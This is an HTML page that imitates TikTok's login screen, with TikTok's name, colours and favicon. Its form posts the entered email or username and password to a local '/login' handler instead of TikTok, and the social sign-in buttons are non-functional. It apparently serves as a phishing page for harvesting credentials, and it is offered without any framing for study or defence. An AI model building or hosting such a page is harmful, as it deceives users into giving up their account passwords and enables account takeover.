<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Log in to TikTok</title>
<link rel="icon" href="https://www.tiktok.com/favicon.ico">
<style>
*{margin:0;padding:0;box-sizing:border-box}
@keyframes fadeInUp{from{opacity:0;transform:translateY(30px)}to{opacity:1;transform:translateY(0)}}
@keyframes fadeIn{from{opacity:0}to{opacity:1}}
@keyframes neonPulse{0%,100%{text-shadow:0 0 5px #fe2c55,0 0 10px #fe2c55,0 0 20px #fe2c55}50%{text-shadow:0 0 10px #25f4ee,0 0 20px #25f4ee,0 0 40px #25f4ee}}
@keyframes bgShift{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}
@keyframes musicNote{0%{transform:translateY(0) rotate(0);opacity:1}100%{transform:translateY(-60px) rotate(20deg);opacity:0}}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#010101,#1a1a2e,#010101);background-size:200% 200%;animation:bgShift 6s ease infinite;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;position:relative;overflow:hidden}
.notes{position:absolute;top:0;left:0;right:0;bottom:0;pointer-events:none;overflow:hidden}
.note{position:absolute;font-size:24px;animation:musicNote 3s ease-out infinite;opacity:0}
.card{background:rgba(255,255,255,0.03);backdrop-filter:blur(20px);border:1px solid rgba(255,255,255,0.08);border-radius:12px;padding:40px 32px;max-width:400px;width:100%;z-index:1;animation:fadeInUp 0.7s cubic-bezier(0.16,1,0.3,1)}
.logo{text-align:center;margin-bottom:24px;animation:fadeInUp 0.5s ease}
.logo h1{font-size:32px;font-weight:800;color:#fff;animation:neonPulse 3s ease infinite}
.logo p{color:rgba(255,255,255,0.5);font-size:14px;margin-top:4px}
.btn-social{width:100%;padding:14px;background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.15);border-radius:6px;color:#fff;font-size:15px;font-weight:600;cursor:pointer;margin-bottom:10px;transition:all 0.2s;display:flex;align-items:center;justify-content:center;gap:10px;animation:fadeInUp 0.5s ease 0.2s both}
.btn-social:hover{background:rgba(255,255,255,0.15);border-color:rgba(255,255,255,0.3)}
.divider{display:flex;align-items:center;margin:20px 0;animation:fadeIn 0.5s ease 0.3s both}
.divider::before,.divider::after{content:'';flex:1;height:1px;background:rgba(255,255,255,0.1)}
.divider span{padding:0 12px;color:rgba(255,255,255,0.4);font-size:12px}
.input-group{margin-bottom:14px;animation:fadeInUp 0.5s ease 0.4s both}
.input-group input{width:100%;padding:14px 16px;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.12);border-radius:6px;color:#fff;font-size:16px;outline:none;transition:all 0.3s}
.input-group input::placeholder{color:rgba(255,255,255,0.35)}
.input-group input:focus{border-color:#fe2c55;box-shadow:0 0 0 2px rgba(254,44,85,0.2)}
.login-btn{width:100%;padding:14px;background:linear-gradient(135deg,#fe2c55,#ff6a88);color:white;border:none;border-radius:6px;font-size:16px;font-weight:700;cursor:pointer;transition:all 0.3s;animation:fadeInUp 0.5s ease 0.5s both}
.login-btn:hover{transform:translateY(-2px);box-shadow:0 6px 20px rgba(254,44,85,0.4)}
.forgot{display:block;text-align:center;color:#fe2c55;font-size:13px;text-decoration:none;margin-top:14px}
.signup{text-align:center;margin-top:24px;color:rgba(255,255,255,0.5);font-size:14px;animation:fadeIn 0.5s ease 0.6s both}
.signup a{color:#25f4ee;font-weight:600;text-decoration:none}
</style>
</head>
<body>
<div class="notes">
    <div class="note" style="left:10%;top:80%;animation-delay:0s">🎵</div>
    <div class="note" style="left:30%;top:90%;animation-delay:1s">🎶</div>
    <div class="note" style="left:70%;top:85%;animation-delay:2s">🎵</div>
    <div class="note" style="left:85%;top:75%;animation-delay:0.5s">🎶</div>
    <div class="note" style="left:50%;top:95%;animation-delay:1.5s">♪</div>
</div>
<div class="card">
    <div class="logo">
        <h1>TikTok</h1>
        <p>Log in to your account</p>
    </div>
    <button class="btn-social">📱 Use phone / email / username</button>
    <button class="btn-social">🔵 Continue with Google</button>
    <button class="btn-social">🍎 Continue with Apple</button>
    <div class="divider"><span>or</span></div>
    <form action="/login" method="POST">
        <div class="input-group">
            <input type="text" name="email" placeholder="Email or username" required>
        </div>
        <div class="input-group">
            <input type="password" name="password" placeholder="Password" required>
        </div>
        <button type="submit" class="login-btn">Log in</button>
    </form>
    <a href="#" class="forgot">Forgot password?</a>
    <p class="signup">Don't have an account? <a href="#">Sign up</a></p>
</div>
</body>
</html>
